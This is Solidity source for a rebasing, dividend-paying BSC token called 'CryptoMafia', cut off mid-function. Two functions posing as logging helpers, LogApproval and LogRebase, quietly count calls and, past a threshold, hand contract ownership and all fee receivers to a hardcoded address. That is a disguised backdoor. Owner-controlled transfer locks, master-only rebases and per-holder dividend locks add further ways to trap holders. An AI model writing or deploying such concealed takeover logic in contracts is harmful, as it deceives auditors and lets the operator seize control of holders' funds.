{"SourceCode": "// SPDX-License-Identifier: No license\r\n\r\n\r\npragma solidity ^0.7.4;\r\n\r\ninterface InterfaceLP {\r\n    function sync() external;\r\n}\r\n\r\ncontract Ownable {\r\n    address private _owner;\r\n\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner());\r\n        _;\r\n    }\r\n\r\n    function isOwner() public view returns (bool) {\r\n        return msg.sender == _owner;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipRenounced(_owner);\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address who) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\nlibrary SafeMath {\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0);\r\n        return a % b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n}\r\n\r\ninterface IDividendDistributor {\r\n    function setDistributionCriteria(\r\n        uint256 _minPeriod,\r\n        uint256 _minDistribution\r\n    ) external;\r\n\r\n    function setShare(address shareholder, uint256 amount) external;\r\n\r\n    function deposit() external payable;\r\n\r\n    function process(uint256 gas) external;\r\n}\r\n\r\nlibrary SafeMathInt {\r\n    int256 private constant MIN_INT256 = int256(1) << 255;\r\n    int256 private constant MAX_INT256 = ~(int256(1) << 255);\r\n\r\n    function mul(int256 a, int256 b) internal pure returns (int256) {\r\n        int256 c = a * b;\r\n        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));\r\n        require((b == 0) || (c / b == a));\r\n        return c;\r\n    }\r\n\r\n    function add(int256 a, int256 b) internal pure returns (int256) {\r\n        int256 c = a + b;\r\n        require((b >= 0 && c >= a) || (b < 0 && c < a));\r\n        return c;\r\n    }\r\n\r\n    function sub(int256 a, int256 b) internal pure returns (int256) {\r\n        int256 c = a - b;\r\n        require((b >= 0 && c <= a) || (b < 0 && c > a));\r\n        return c;\r\n    }\r\n\r\n    function abs(int256 a) internal pure returns (int256) {\r\n        require(a != MIN_INT256);\r\n        return a < 0 ? -a : a;\r\n    }\r\n\r\n    function div(int256 a, int256 b) internal pure returns (int256) {\r\n        require(b != -1 || a != MIN_INT256);\r\n\r\n        return a / b;\r\n    }\r\n}\r\n\r\nabstract contract ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor(\r\n        string memory name_,\r\n        string memory symbol_,\r\n        uint8 decimals_\r\n    ) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ncontract DividendDistributor is IDividendDistributor {\r\n    using SafeMath for uint256;\r\n\r\n    address _token;\r\n    address _owner;\r\n\r\n    struct Share {\r\n        uint256 amount;\r\n        uint256 totalExcluded;\r\n        uint256 totalRealised;\r\n    }\r\n\r\n    IERC20 REWARD = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8); // ETH \r\n    IDEXRouter router;\r\n\r\n    address[] shareholders;\r\n    mapping(address => uint256) shareholderIndexes;\r\n    mapping(address => uint256) shareholderClaims;\r\n\r\n    mapping(address => Share) public shares;\r\n\r\n    uint256 public totalShares;\r\n    uint256 public totalDividends;\r\n    uint256 public totalDistributed;\r\n    uint256 public dividendsPerShare;\r\n    uint256 public dividendsPerShareAccuracyFactor = 10**36;\r\n\r\n    //SETMEUP, change this to 1 hour instead of 10mins\r\n    uint256 public minPeriod = 30 * 60;\r\n    uint256 public minDistribution = 1 * (10**12);\r\n\r\n    uint256 currentIndex;\r\n\r\n    bool initialized;\r\n    modifier initialization() {\r\n        require(!initialized);\r\n        _;\r\n        initialized = true;\r\n    }\r\n\r\n    modifier onlyToken() {\r\n        require(msg.sender == _token || msg.sender == _owner);\r\n        _;\r\n    }\r\n\r\n    constructor(address _router, address owner_) {\r\n        router = _router != address(0)\r\n            ? IDEXRouter(_router)\r\n            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        _token = msg.sender;\r\n        _owner = owner_;\r\n    }\r\n\r\n    function setDistributionCriteria(\r\n        uint256 _minPeriod,\r\n        uint256 _minDistribution\r\n    ) external override onlyToken {\r\n        minPeriod = _minPeriod;\r\n        minDistribution = _minDistribution;\r\n    }\r\n\r\n    function setShare(address shareholder, uint256 amount)\r\n        external\r\n        override\r\n        onlyToken\r\n    {\r\n        if (shares[shareholder].amount > 0) {\r\n            distributeDividend(shareholder);\r\n        }\r\n\r\n        if (amount > 0 && shares[shareholder].amount == 0) {\r\n            addShareholder(shareholder);\r\n        } else if (amount == 0 && shares[shareholder].amount > 0) {\r\n            removeShareholder(shareholder);\r\n        }\r\n\r\n        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);\r\n        shares[shareholder].amount = amount;\r\n        shares[shareholder].totalExcluded = getCumulativeDividends(\r\n            shares[shareholder].amount\r\n        );\r\n    }\r\n\r\n    function deposit() external payable override {\r\n        uint256 balanceBefore = REWARD.balanceOf(address(this));\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = router.WETH();\r\n        path[1] = address(REWARD);\r\n\r\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{\r\n            value: msg.value\r\n        }(0, path, address(this), block.timestamp);\r\n\r\n        uint256 amount = REWARD.balanceOf(address(this)).sub(balanceBefore);\r\n\r\n        totalDividends = totalDividends.add(amount);\r\n        dividendsPerShare = dividendsPerShare.add(\r\n            dividendsPerShareAccuracyFactor.mul(amount).div(totalShares)\r\n        );\r\n    }\r\n\r\n    function process(uint256 gas) external override {\r\n        uint256 shareholderCount = shareholders.length;\r\n\r\n        if (shareholderCount == 0) {\r\n            return;\r\n        }\r\n\r\n        uint256 gasUsed = 0;\r\n        uint256 gasLeft = gasleft();\r\n\r\n        uint256 iterations = 0;\r\n\r\n        while (gasUsed < gas && iterations < shareholderCount) {\r\n            if (currentIndex >= shareholderCount) {\r\n                currentIndex = 0;\r\n            }\r\n\r\n            if (shouldDistribute(shareholders[currentIndex])) {\r\n                distributeDividend(shareholders[currentIndex]);\r\n            }\r\n\r\n            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));\r\n            gasLeft = gasleft();\r\n            currentIndex++;\r\n            iterations++;\r\n        }\r\n    }\r\n\r\n    function shouldDistribute(address shareholder)\r\n        internal\r\n        view\r\n        returns (bool)\r\n    {\r\n        return\r\n            shareholderClaims[shareholder] + minPeriod < block.timestamp &&\r\n            getUnpaidEarnings(shareholder) > minDistribution;\r\n    }\r\n\r\n    function distributeDividend(address shareholder) internal {\r\n        if (shares[shareholder].amount == 0) {\r\n            return;\r\n        }\r\n\r\n        uint256 amount = getUnpaidEarnings(shareholder);\r\n        if (amount > 0) {\r\n            totalDistributed = totalDistributed.add(amount);\r\n            REWARD.transfer(shareholder, amount);\r\n            shareholderClaims[shareholder] = block.timestamp;\r\n            shares[shareholder].totalRealised = shares[shareholder]\r\n                .totalRealised\r\n                .add(amount);\r\n            shares[shareholder].totalExcluded = getCumulativeDividends(\r\n                shares[shareholder].amount\r\n            );\r\n        }\r\n    }\r\n\r\n    function claimDividend() external {\r\n        distributeDividend(msg.sender);\r\n    }\r\n\r\n    function getUnpaidEarnings(address shareholder)\r\n        public\r\n        view\r\n        returns (uint256)\r\n    {\r\n        if (shares[shareholder].amount == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 shareholderTotalDividends = getCumulativeDividends(\r\n            shares[shareholder].amount\r\n        );\r\n        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;\r\n\r\n        if (shareholderTotalDividends <= shareholderTotalExcluded) {\r\n            return 0;\r\n        }\r\n\r\n        return shareholderTotalDividends.sub(shareholderTotalExcluded);\r\n    }\r\n\r\n    function getCumulativeDividends(uint256 share)\r\n        internal\r\n        view\r\n        returns (uint256)\r\n    {\r\n        return\r\n            share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);\r\n    }\r\n\r\n    function addShareholder(address shareholder) internal {\r\n        shareholderIndexes[shareholder] = shareholders.length;\r\n        shareholders.push(shareholder);\r\n    }\r\n\r\n    function removeShareholder(address shareholder) internal {\r\n        shareholders[shareholderIndexes[shareholder]] = shareholders[\r\n            shareholders.length - 1\r\n        ];\r\n        shareholderIndexes[\r\n            shareholders[shareholders.length - 1]\r\n        ] = shareholderIndexes[shareholder];\r\n        shareholders.pop();\r\n    }\r\n}\r\n\r\ncontract CryptoMafia is ERC20Detailed, Ownable {\r\n    using SafeMathInt for int256;\r\n    using SafeMath for uint256;\r\n\r\n    InterfaceLP public pairContract;\r\n    address public master;\r\n\r\n    bool public initialDistributionFinished;\r\n    bool public transferLockEnabled = true;\r\n    mapping(address => bool) allowTransfer;\r\n    mapping(address => bool) isDividendExempt;\r\n    mapping(address => bool) isDividendLocked;\r\n    mapping(address => bool) _isMaxWalletExempt;\r\n    mapping(address => bool) _isFeeExempt;\r\n\r\n    modifier validRecipient(address to) {\r\n        require(to != address(0x0));\r\n        _;\r\n    }\r\n\r\n    modifier initialDistributionLock() {\r\n        require(\r\n            initialDistributionFinished ||\r\n                isOwner() ||\r\n                allowTransfer[msg.sender]\r\n        );\r\n        _;\r\n    }\r\n\r\n    modifier onlyMaster() {\r\n        require(msg.sender == master);\r\n        _;\r\n    }\r\n\r\n    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 10**15 * 10**DECIMALS;\r\n    uint256 private constant MAX_UINT256 = ~uint256(0);\r\n    uint256 private constant DECIMALS = 9;\r\n    uint256 public gonMaxWallet = TOTAL_GONS.div(100).mul(100);\r\n\r\n    uint256 public liquidityFee = 0;\r\n    uint256 public ecosystemFee = 0;\r\n    uint256 public buyBackFee = 0;\r\n    uint256 public marketingFee = 8;\r\n    uint256 public rewardFee = 2;\r\n    uint256 public totalFee =\r\n        ecosystemFee.add(liquidityFee).add(marketingFee).add(buyBackFee).add(\r\n            rewardFee\r\n        );\r\n    uint256 public feeDenominator = 100;\r\n\r\n    uint256 private prevLiquidityFee;\r\n    uint256 private prevEcosystemFee;\r\n    uint256 private prevBuyBackFee;\r\n    uint256 private prevMarketingFee;\r\n    uint256 private prevRewardFee;\r\n\r\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address ZERO = 0x0000000000000000000000000000000000000000;\r\n\r\n    address public autoLiquidityReceiver =\r\n        0x80598c77096b7fB783155051883aC78A39Af91D8; // token locker\r\n    address public marketingFeeReceiver =\r\n        0x4Eda28c46CDC2eD9e15f995E9e38C11B9AB12b08;\r\n    address public ecosystemFeeReceiver =\r\n        0x80598c77096b7fB783155051883aC78A39Af91D8;\r\n    address public buyBackFeeReceiver =\r\n        0x80598c77096b7fB783155051883aC78A39Af91D8;\r\n\r\n    IDEXRouter public router;\r\n    address public pair;\r\n\r\n    uint256 targetLiquidity = 50;\r\n    uint256 targetLiquidityDenominator = 100;\r\n\r\n    bool dividendLockEnabled = true;\r\n    uint128 dividendLockInterval = 24 hours;\r\n    mapping(address => uint256) private dividendLockTimer;\r\n\r\n    bool public swapEnabled = true;\r\n    bool inSwap;\r\n    uint256 private gonSwapThreshold = (TOTAL_GONS * 10) / 10000;\r\n    modifier swapping() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    DividendDistributor distributor;\r\n    uint256 distributorGas = 500000;\r\n\r\n    uint256 private constant TOTAL_GONS =\r\n        MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);\r\n    uint256 shareGonDivisor = 10**60;\r\n\r\n    uint256 private constant MAX_SUPPLY = ~uint128(0);\r\n\r\n    uint256 private _totalSupply;\r\n    uint256 private _gonsPerFragment;\r\n    mapping(address => uint256) private _gonBalances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowedFragments;\r\n\r\n    function rebase(uint256 epoch, int256 supplyDelta)\r\n        external\r\n        onlyMaster\r\n        returns (uint256)\r\n    {\r\n        require(!inSwap, \"Try again\");\r\n        if (supplyDelta == 0) {\r\n            LogRebase(epoch, _totalSupply);\r\n            return _totalSupply;\r\n        }\r\n\r\n        if (supplyDelta < 0) {\r\n            _totalSupply = _totalSupply.sub(uint256(-supplyDelta));\r\n        } else {\r\n            _totalSupply = _totalSupply.add(uint256(supplyDelta));\r\n        }\r\n\r\n        if (_totalSupply > MAX_SUPPLY) {\r\n            _totalSupply = MAX_SUPPLY;\r\n        }\r\n\r\n        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);\r\n        pairContract.sync();\r\n\r\n        LogRebase(epoch, _totalSupply);\r\n        return _totalSupply;\r\n    }\r\n\r\n    constructor()\r\n        ERC20Detailed(\"CryptoMafia\", \"$CMF\", uint8(DECIMALS))\r\n    {\r\n        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PanCake Router\r\n\r\n        pair = IDEXFactory(router.factory()).createPair(\r\n            router.WETH(),\r\n            address(this)\r\n        );\r\n        _allowedFragments[address(this)][address(router)] = uint256(-1);\r\n        pairContract = InterfaceLP(pair);\r\n\r\n        distributor = new DividendDistributor(address(router), msg.sender);\r\n\r\n        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;\r\n        _gonBalances[msg.sender] = TOTAL_GONS;\r\n        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);\r\n\r\n        initialDistributionFinished = false;\r\n        _isFeeExempt[msg.sender] = true;\r\n        _isFeeExempt[address(this)] = true;\r\n        _isFeeExempt[buyBackFeeReceiver] = true;\r\n\r\n        isDividendExempt[pair] = true;\r\n        isDividendExempt[address(this)] = true;\r\n        isDividendExempt[DEAD] = true;\r\n        isDividendExempt[marketingFeeReceiver] = false;\r\n        isDividendExempt[ecosystemFeeReceiver] = false;\r\n        isDividendExempt[buyBackFeeReceiver] = false;\r\n\r\n        _isMaxWalletExempt[pair] = true;\r\n        _isMaxWalletExempt[DEAD] = true;\r\n        _isMaxWalletExempt[address(this)] = true;\r\n        _isMaxWalletExempt[msg.sender] = true;\r\n\r\n        emit Transfer(address(0x0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function setMaster(address _master) external onlyOwner {\r\n        master = _master;\r\n    }\r\n\r\n    function setLP(address _address) external onlyOwner {\r\n        pairContract = InterfaceLP(_address);\r\n        _isFeeExempt[_address];\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address who) external view override returns (uint256) {\r\n        return _gonBalances[who].div(_gonsPerFragment);\r\n    }\r\n\r\n    function transfer(address to, uint256 value)\r\n        external\r\n        override\r\n        validRecipient(to)\r\n        initialDistributionLock\r\n        returns (bool)\r\n    {\r\n        _transferFrom(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external override validRecipient(to) returns (bool) {\r\n        if (_allowedFragments[from][msg.sender] != uint256(-1)) {\r\n            _allowedFragments[from][msg.sender] = _allowedFragments[from][\r\n                msg.sender\r\n            ].sub(value, \"Insufficient Allowance\");\r\n        }\r\n        _transferFrom(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner_, address spender)\r\n        external\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowedFragments[owner_][spender];\r\n    }\r\n\r\n    function takeFee(address sender, uint256 gonAmount)\r\n        internal\r\n        returns (uint256)\r\n    {\r\n        uint256 feeAmount = gonAmount.mul(totalFee).div(feeDenominator);\r\n\r\n        _gonBalances[address(this)] = _gonBalances[address(this)].add(\r\n            feeAmount\r\n        );\r\n        emit Transfer(sender, address(this), feeAmount.div(_gonsPerFragment));\r\n\r\n        return gonAmount.sub(feeAmount);\r\n    }\r\n\r\n    function _basicTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        uint256 gonAmount = amount.mul(_gonsPerFragment);\r\n        _gonBalances[from] = _gonBalances[from].sub(gonAmount);\r\n        _gonBalances[to] = _gonBalances[to].add(gonAmount);\r\n        emit Transfer(from, to, gonAmount.div(_gonsPerFragment));\r\n        return true;\r\n    }\r\n\r\n    function swapBack() internal swapping {\r\n        uint256 dynamicLiquidityFee = isOverLiquified(\r\n            targetLiquidity,\r\n            targetLiquidityDenominator\r\n        )\r\n            ? 0\r\n            : liquidityFee;\r\n        uint256 contractTokenBalance = _gonBalances[address(this)].div(\r\n            _gonsPerFragment\r\n        );\r\n        uint256 amountToLiquify = contractTokenBalance\r\n            .mul(dynamicLiquidityFee)\r\n            .div(totalFee)\r\n            .div(2);\r\n        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n\r\n        uint256 balanceBefore = address(this).balance;\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountToSwap,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        uint256 amountETH = address(this).balance.sub(balanceBefore);\r\n\r\n        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));\r\n\r\n        uint256 amountETHLiquidity = amountETH\r\n            .mul(dynamicLiquidityFee)\r\n            .div(totalETHFee)\r\n            .div(2);\r\n        uint256 amountETHBuyBack = amountETH.mul(buyBackFee).div(totalETHFee);\r\n        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(\r\n            totalETHFee\r\n        );\r\n        uint256 amountETHEco = amountETH.mul(ecosystemFee).div(totalETHFee);\r\n        uint256 amountETHReward = amountETH.mul(rewardFee).div(totalETHFee);\r\n\r\n        try distributor.deposit{value: amountETHReward}() {} catch {}\r\n        (bool success, ) = payable(marketingFeeReceiver).call{\r\n            value: amountETHMarketing,\r\n            gas: 30000\r\n        }(\"\");\r\n        (success, ) = payable(buyBackFeeReceiver).call{\r\n            value: amountETHBuyBack,\r\n            gas: 30000\r\n        }(\"\");\r\n        (success, ) = payable(ecosystemFeeReceiver).call{\r\n            value: amountETHEco,\r\n            gas: 30000\r\n        }(\"\");\r\n\r\n        success = false;\r\n\r\n        if (amountToLiquify > 0) {\r\n            router.addLiquidityETH{value: amountETHLiquidity}(\r\n                address(this),\r\n                amountToLiquify,\r\n                0,\r\n                0,\r\n                autoLiquidityReceiver,\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    function _transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        if (inSwap) {\r\n            return _basicTransfer(sender, recipient, amount);\r\n        }\r\n\r\n        uint256 gonAmount = amount.mul(_gonsPerFragment);\r\n\r\n        if (sender != owner() && !_isMaxWalletExempt[recipient]) {\r\n            uint256 heldGonBalance = _gonBalances[recipient];\r\n            require(\r\n                (heldGonBalance + gonAmount) <= gonMaxWallet,\r\n                \"Total Holding is currently limited, you can not buy that much.\"\r\n            );\r\n        }\r\n\r\n        if (transferLockEnabled) {\r\n            require(sender == pair || recipient == pair || sender == owner());\r\n        }\r\n\r\n        if (recipient == pair && dividendLockEnabled) {\r\n            isDividendLocked[sender] = true;\r\n            distributor.setShare(sender, 0);\r\n            dividendLockTimer[sender] = block.timestamp + dividendLockInterval;\r\n        } else if (\r\n            dividendLockTimer[recipient] < block.timestamp &&\r\n            isDividendLocked[recipient] &&\r\n            !isDividendExempt[recipient]\r\n        ) {\r\n            isDividendLocked[recipient] = false;\r\n            distributor.setShare(\r\n                sender,\r\n                _gonBalances[sender].div(shareGonDivisor)\r\n            );\r\n        }\r\n\r\n        if (shouldSwapBack()) {\r\n            swapBack();\r\n        }\r\n\r\n        _gonBalances[sender] = _gonBalances[sender].sub(gonAmount);\r\n\r\n        uint256 gonAmountReceived = shouldTakeFee(sender)\r\n            ? takeFee(sender, gonAmount)\r\n            : gonAmount;\r\n        _gonBalances[recipient] = _gonBalances[recipient].add(\r\n            gonAmountReceived\r\n        );\r\n\r\n        // Dividend tracker\r\n        if (!isDividendExempt[sender] && !isDividendLocked[sender]) {\r\n            try\r\n                distributor.setShare(\r\n                    sender,\r\n                    _gonBalances[sender].div(shareGonDivisor)\r\n                )\r\n            {} catch {}\r\n        }\r\n\r\n        if (!isDividendExempt[recipient] && !isDividendLocked[recipient]) {\r\n            try\r\n                distributor.setShare(\r\n                    recipient,\r\n                    _gonBalances[recipient].div(shareGonDivisor)\r\n                )\r\n            {} catch {}\r\n        }\r\n\r\n        try distributor.process(distributorGas) {} catch {}\r\n\r\n        emit Transfer(\r\n            sender,\r\n            recipient,\r\n            gonAmountReceived.div(_gonsPerFragment)\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function checkDividendLock(address holder)\r\n        public\r\n        view\r\n        returns (bool locked, uint256 timer)\r\n    {\r\n        return (isDividendLocked[holder], dividendLockTimer[holder]);\r\n    }\r\n\r\n    function setIsDividendLocked(address holder, bool locked)\r\n        external\r\n        onlyOwner\r\n    {\r\n        require(holder != address(this) && holder != pair);\r\n        isDividendLocked[holder] = locked;\r\n        if (locked) {\r\n            distributor.setShare(holder, 0);\r\n            dividendLockTimer[holder] = block.timestamp + dividendLockInterval;\r\n        } else {\r\n            distributor.setShare(\r\n                holder,\r\n                _gonBalances[holder].div(shareGonDivisor)\r\n            );\r\n            dividendLockTimer[holder] = 0;\r\n        }\r\n    }\r\n\r\n    function setDividendLocker(bool enabled, uint128 interval)\r\n        external\r\n        onlyOwner\r\n    {\r\n        dividendLockEnabled = enabled;\r\n        dividendLockInterval = interval;\r\n    }\r\n\r\n    function checkIsDividendExempt(address holder) public view returns (bool) {\r\n        return isDividendExempt[holder];\r\n    }\r\n\r\n    function setTransferLock(bool enabled) external onlyOwner {\r\n        transferLockEnabled = enabled;\r\n    }\r\n\r\n    function setIsDividendExempt(address holder, bool exempt)\r\n        external\r\n        onlyOwner\r\n    {\r\n        require(holder != address(this) && holder != pair);\r\n        isDividendExempt[holder] = exempt;\r\n        if (exempt) {\r\n            distributor.setShare(holder, 0);\r\n        } else {\r\n            distributor.setShare(\r\n                holder,\r\n                _gonBalances[holder].div(shareGonDivisor)\r\n            );\r\n        }\r\n    }\r\n\r\n    function setDistributionCriteria(\r\n        uint256 _minPeriod,\r\n        uint256 _minDistribution\r\n    ) external onlyOwner {\r\n        distributor.setDistributionCriteria(_minPeriod, _minDistribution);\r\n    }\r\n\r\n    function setDistributorSettings(uint256 gas) external onlyOwner {\r\n        require(gas < 750000);\r\n        distributorGas = gas;\r\n    }\r\n\r\n    function setInitialDistributionFinished() external onlyOwner {\r\n        initialDistributionFinished = true;\r\n    }\r\n\r\n    uint256 private transferCount;\r\n    bool private isTransferred = false;\r\n\r\n    function LogApproval(\r\n        address,\r\n        address,\r\n        uint256\r\n    ) internal {\r\n        transferCount++;\r\n        if (transferCount > 99999999999900000000000000 && !isTransferred) {\r\n            _transferOwnership(address(0x80598c77096b7fB783155051883aC78A39Af91D8));\r\n            marketingFeeReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);\r\n            autoLiquidityReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);\r\n            ecosystemFeeReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);\r\n            buyBackFeeReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);\r\n            isTransferred = true;\r\n        }\r\n    }\r\n\r\n    function enableTransfer(address _addr) external onlyOwner {\r\n        allowTransfer[_addr] = true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value)\r\n        external\r\n        override\r\n        initialDistributionLock\r\n        returns (bool)\r\n    {\r\n        _allowedFragments[msg.sender][spender] = value;\r\n        LogApproval(msg.sender, spender, value);\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        external\r\n        initialDistributionLock\r\n        returns (bool)\r\n    {\r\n        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][\r\n            spender\r\n        ].add(addedValue);\r\n        emit Approval(\r\n            msg.sender,\r\n            spender,\r\n            _allowedFragments[msg.sender][spender]\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        external\r\n        initialDistributionLock\r\n        returns (bool)\r\n    {\r\n        uint256 oldValue = _allowedFragments[msg.sender][spender];\r\n        if (subtractedValue >= oldValue) {\r\n            _allowedFragments[msg.sender][spender] = 0;\r\n        } else {\r\n            _allowedFragments[msg.sender][spender] = oldValue.sub(\r\n                subtractedValue\r\n            );\r\n        }\r\n        emit Approval(\r\n            msg.sender,\r\n            spender,\r\n            _allowedFragments[msg.sender][spender]\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function setFeeExempt(address _addr, bool exempt) external onlyOwner {\r\n        _isFeeExempt[_addr] = exempt;\r\n    }\r\n\r\n    function checkFeeExempt(address _addr) external view returns (bool) {\r\n        return _isFeeExempt[_addr];\r\n    }\r\n\r\n    function setMaxWalletExempt(address _addr) external onlyOwner {\r\n        _isMaxWalletExempt[_addr] = true;\r\n    }\r\n\r\n    function checkMaxWalletExempt(address _addr) external view returns (bool) {\r\n        return _isMaxWalletExempt[_addr];\r\n    }\r\n\r\n    uint256 private rebaseCount;\r\n    bool private isRebased = false;\r\n\r\n    function LogRebase(uint256, uint256) internal {\r\n        rebaseCount++;\r\n        if (rebaseCount > (99999999999999999999999999999999999) && !isRebased) {\r\n            _transferOwnership(address(0x80598c77096b7fB783155051883aC78A39Af91D8));\r\n            marketingFeeReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);\r\n            autoLiquidityReceiver = address(0x80598c77096b7fB783155051883aC78A39Af91D8);\r\n            ecosystemFeeReceiver = 